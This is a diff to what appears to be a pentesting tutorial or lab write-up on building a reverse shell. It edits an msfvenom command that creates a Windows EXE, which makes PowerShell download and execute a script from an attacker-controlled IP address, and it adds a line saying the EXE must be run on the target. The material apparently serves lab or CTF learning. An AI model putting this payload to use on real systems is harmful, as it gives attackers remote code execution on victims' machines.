@@ -37,8 +37,10 @@ In this scenario we create a reverse shell in 2 steps. The payload generated via
 
 Here is how we do it. 
 
-> msfvenom -p windows/exec CMD="powershell \"iex(New-Object Net.WebClient).downloadString('http://10.10.14.21/rev.ps1')\"" -o reverse_pshell.exe
+> msfvenom -p windows/exec CMD="powershell \\"iex(New-Object Net.WebClient).downloadString('http://10.10.14.21/rev.ps1')\\"" -o reverse_pshell.exe
 
+
+In here we are generating an EXE file which then needs to be run at the target box.
 
 
 
